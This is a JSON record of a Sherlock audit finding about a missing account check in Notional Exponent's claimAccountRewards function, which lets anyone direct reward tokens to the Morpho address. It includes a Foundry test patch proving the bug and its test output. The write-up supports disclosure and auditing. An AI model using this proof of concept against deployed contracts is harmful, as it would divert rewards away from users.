{
    "id": 62488,
    "kind": "GIT",
    "auditfirm_id": 3,
    "impact": "HIGH",
    "finders_count": 5,
    "protocol_id": 3104,
    "title": "H-7: `RewardManagerMixin.claimAccountRewards` lacks of necessary param check.",
    "content": "\nSource: https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/624 \n\n## Found by \nBluedragon, BugsBunny, elolpuer, jasonxiale, patitonar\n\n### Summary\n\nIn current implementation, `RewardManagerMixin.claimAccountRewards` function doesn't check `account` paramm, if the `MORPHO` is passed in as `account`, rewards will be transferred to `MORPHO`. Which isn't correct.\n\n\n### Root Cause\n\n1. As [RewardManagerMixin.claimAccountRewards](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/rewards/RewardManagerMixin.sol#L155-L177) shows, the function can be called by anyone, and the `account` param can be any address.\n2. If the `msg.sender` isn't a lending router, the `sharesHeld` will be calculated by `balanceOf(account)` in [RewardManagerMixin.sol#L160-L164](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/rewards/RewardManagerMixin.sol#L160-L164)\n```solidity\n155     function claimAccountRewards(\n156         address account,\n157         uint256 sharesHeld\n158     ) external nonReentrant returns (uint256[] memory rewards) {\n159         uint256 effectiveSupplyBefore = effectiveSupply();\n160         if (!ADDRESS_REGISTRY.isLendingRouter(msg.sender)) {\n161             // If the caller is not a lending router we get the shares held in a\n162             // native token account.\n163             sharesHeld = balanceOf(account);\n164         }\n...\n177     }\n```\n\n3. While a normal user calls `AbstractLendingRouter.enterPosition` to enter a vault, the vault will mint vaultToken in [AbstractLendingRouter.sol#L241](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/routers/AbstractLendingRouter.sol#L241), and the vaultToken will be transferred to MORPHO in [AbstractLendingRouter.sol#L244](https://github.com/sherlock-audit/2025-06-notional-exponent/blob/82c87105f6b32bb362d7523356f235b5b07509f9/notional-v4/src/routers/AbstractLendingRouter.sol#L244)\n**So after `AbstractLendingRouter.enterPosition`, MORPHO's vaultToken balance will increase**. \n\n  So if `MORPHO` is passed to `RewardManagerMixin.claimAccountRewards`, it'll get reward tokens, which isn't correct.\n\n\n\n### Internal Pre-conditions\n\nNone\n\n### External Pre-conditions\n\nNone\n\n### Attack Path\n\nThe malicious calls `AbstractLendingRouter.enterPosition` with MORPHO address as `account`.\n\nPlease apply the following patch in `tests/TestRewardManager.sol` and run\n```bash\nforge test --mc TestRewardManager --mt test_liquidate_withRewards -vv\n[â ‘] Compiling...\nNo files changed, compilation skipped\n\nRan 1 test for tests/TestRewardManager.sol:TestRewardManager\n[PASS] test_liquidate_withRewards() (gas: 1519209)\nLogs:\n  y.balanceOf                             : 0\n  y.balanceOf                             : 50000000000000000000000000000\n  y                                       : 0x1d1499e622D69689cdf9004d05Ec547d650Ff211\n  rewardToken.balanceOf(MorPho)           : 0\n  emissionsToken.balanceOf(MorPho)        : 0\n  rewardToken.balanceOf(liquidator)       : 0\n  emissionsToken.balanceOf(liquidator)    : 0\n  rewardToken.balanceOf(MorPho)           : 119999671233240000000000\n  emissionsToken.balanceOf(MorPho)        : 1090909080000000000\n  rewardToken.balanceOf(liquidator)       : 0\n  emissionsToken.balanceOf(liquidator)    : 454545450000000000\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 532.76ms (11.83ms CPU time)\n\nRan 1 test suite in 628.60ms (532.76ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n```\n\nAs above output shows, MORPHO get rewards, which isn't correct.\n\n```diff\ndiff --git a/notional-v4/tests/TestRewardManager.sol b/notional-v4/tests/TestRewardManager.sol\nindex dfdd463..286db0a 100644\n--- a/notional-v4/tests/TestRewardManager.sol\n+++ b/notional-v4/tests/TestRewardManager.sol\n@@ -10,6 +10,7 @@ import \"../src/withdraws/GenericERC20.sol\";\n import {AbstractRewardManager, RewardPoolStorage} from \"../src/rewards/AbstractRewardManager.sol\";\n import {RewardManagerMixin} from \"../src/rewards/RewardManagerMixin.sol\";\n import {ConvexRewardManager} from \"../src/rewards/ConvexRewardManager.sol\";\n+import {console2} from \"forge-std/src/console2.sol\";\n\n contract TestRewardManager is TestMorphoYieldStrategy {\n     IRewardManager rm;\n@@ -337,7 +338,10 @@ contract TestRewardManager is TestMorphoYieldStrategy {\n         }\n     }\n\n-    function test_liquidate_withRewards(bool hasEmissions, bool hasRewards, bool isPartialLiquidation) public {\n+    function test_liquidate_withRewards() public {\n+        bool hasEmissions = true;\n+        bool hasRewards  = true;\n+        bool isPartialLiquidation = true;\n         int256 originalPrice = o.latestAnswer();\n         address liquidator = makeAddr(\"liquidator\");\n         if (hasEmissions) {\n@@ -365,7 +369,9 @@ contract TestRewardManager is TestMorphoYieldStrategy {\n         asset.approve(address(lendingRouter), type(uint256).max);\n         uint256 sharesToLiquidate = isPartialLiquidation ? sharesBefore / 2 : sharesBefore;\n         // This should trigger a claim on rewards\n+        console2.log(\"y.balanceOf                             :\", y.balanceOf(address(liquidator)));\n         uint256 sharesToLiquidator = lendingRouter.liquidate(msg.sender, address(y), sharesToLiquidate, 0);\n+        console2.log(\"y.balanceOf                             :\", y.balanceOf(address(liquidator)));\n         vm.stopPrank();\n\n         if (hasRewards) assertApproxEqRel(rewardToken.balanceOf(msg.sender), expectedRewards, 0.0001e18, \"Liquidated account shares\");\n@@ -380,21 +386,22 @@ contract TestRewardManager is TestMorphoYieldStrategy {\n         if (hasEmissions) vm.warp(block.timestamp + 1 days);\n         uint256 emissionsForLiquidator = 1e18 * sharesToLiquidator / y.totalSupply();\n\n+        console2.log(\"y                                       :\", address(y));\n+        console2.log(\"rewardToken.balanceOf(MorPho)           :\", rewardToken.balanceOf(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb)));\n+        console2.log(\"emissionsToken.balanceOf(MorPho)        :\", emissionsToken.balanceOf(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));\n+        console2.log(\"rewardToken.balanceOf(liquidator)       :\", rewardToken.balanceOf(liquidator));\n+        console2.log(\"emissionsToken.balanceOf(liquidator)    :\", emissionsToken.balanceOf(liquidator));\n         // This second parameter is ignored because we get the balanceOf from\n         // the contract itself.\n+        vm.startPrank(address(0xa1a2bbccddeeff));\n+        RewardManagerMixin(address(rm)).claimAccountRewards(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb), type(uint256).max);\n+        vm.stopPrank();\n         RewardManagerMixin(address(rm)).claimAccountRewards(liquidator, type(uint256).max);\n\n-        uint256 expectedRewardsForLiquidator = hasRewards ? y.convertSharesToYieldToken(sharesToLiquidator) : 0;\n-        if (hasRewards) assertApproxEqRel(rewardToken.balanceOf(liquidator), expectedRewardsForLiquidator, 0.0001e18, \"Liquidator account rewards\");\n-        if (hasEmissions) assertApproxEqRel(emissionsToken.balanceOf(liquidator), emissionsForLiquidator, 0.0010e18, \"Liquidator account emissions\");\n-\n-        vm.prank(msg.sender);\n-        lendingRouter.claimRewards(address(y));\n-        uint256 sharesAfterUser = lendingRouter.balanceOfCollateral(msg.sender, address(y));\n-        uint256 emissionsForUserAfter = 1e18 * sharesAfterUser / y.totalSupply();\n-\n-        if (hasRewards) assertApproxEqRel(rewardToken.balanceOf(msg.sender), expectedRewards + expectedRewards - expectedRewardsForLiquidator, 0.0001e18, \"Liquidated account rewards\");\n-        if (hasEmissions) assertApproxEqRel(emissionsToken.balanceOf(msg.sender), emissionsForUser + emissionsForUserAfter, 0.0010e18, \"Liquidated account emissions\");\n+        console2.log(\"rewardToken.balanceOf(MorPho)           :\", rewardToken.balanceOf(address(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb)));\n+        console2.log(\"emissionsToken.balanceOf(MorPho)        :\", emissionsToken.balanceOf(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb));\n+        console2.log(\"rewardToken.balanceOf(liquidator)       :\", rewardToken.balanceOf(liquidator));\n+        console2.log(\"emissionsToken.balanceOf(liquidator)    :\", emissionsToken.balanceOf(liquidator));\n     }\n\n     function test_migrate_withRewards(bool hasEmissions, bool hasRewards) public {\n@@ -761,4 +768,4 @@ contract TestRewardManager is TestMorphoYieldStrategy {\n         assertEq(rewardToken.balanceOf(msg.sender), rewardsBefore1, \"User account rewards no change\");\n     }\n\n-}\n\\ No newline at end of file\n+}\n```\n\n\n### Impact\n\nBecase MORPHO will owns most of vaultToken, most of the rewards will be transferred to MORPHO, leading users get less rewards\n\n\n### PoC\n\n_No response_\n\n### Mitigation\n\n_No response_\n\n## Discussion\n\n**sherlock-admin2**\n\nThe protocol team fixed this issue in the following PRs/commits:\nhttps://github.com/notional-finance/notional-v4/pull/16/files\n\n\n\n\n",
    "summary": "\nThe bug report discusses a vulnerability in the current implementation of the `RewardManagerMixin.claimAccountRewards` function. This function does not check the `account` parameter, meaning that if the address of the `MORPHO` token is passed in, the rewards will be transferred to `MORPHO`. This is incorrect behavior and could result in MORPHO receiving a large portion of the rewards instead of the intended recipient. The root cause of this issue is that the function can be called by anyone and the `account` parameter can be any address. Additionally, when a normal user calls `AbstractLendingRouter.enterPosition` to enter a vault, the vaultToken will be transferred to MORPHO, meaning that if `MORPHO` is passed to `RewardManagerMixin.claimAccountRewards`, it will receive rewards. The impact of this bug is that users may receive less rewards than expected. The protocol team has fixed this issue in a recent PR/commit.",
    "report_date": "2025-07-18T15:00:00.000Z",
    "contest_prize_txt": "75500 USDC",
    "contest_link": "https://app.sherlock.xyz/audits/contests/1001",
    "sponsor_name": "",
    "sponsor_link": "",
    "quality_score": 0,
    "general_score": 0,
    "source_link": "",
    "github_link": "https://github.com/sherlock-audit/2025-06-notional-exponent-judging/issues/624",
    "pdf_link": "",
    "pdf_page_from": 0,
    "contest_id": "1001",
    "slug": "h-7-rewardmanagermixinclaimaccountrewards-lacks-of-necessary-param-check-sherlock-notional-exponent-git",
    "firm_name": "Sherlock",
    "firm_logo_square": "sherlock_square.png",
    "protocol_name": "Notional Exponent",
    "bookmarked": false,
    "read": false,
    "issues_issue_finders": [
        {
            "wardens_warden": {
                "handle": "patitonar"
            }
        },
        {
            "wardens_warden": {
                "handle": "elolpuer"
            }
        },
        {
            "wardens_warden": {
                "handle": "jasonxiale"
            }
        },
        {
            "wardens_warden": {
                "handle": "Bluedragon"
            }
        },
        {
            "wardens_warden": {
                "handle": "BugsBunny"
            }
        }
    ],
    "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
    },
    "protocols_protocol": {
        "name": "Notional Exponent",
        "protocols_protocolcategoryscore": []
    },
    "issues_issuetagscore": []
}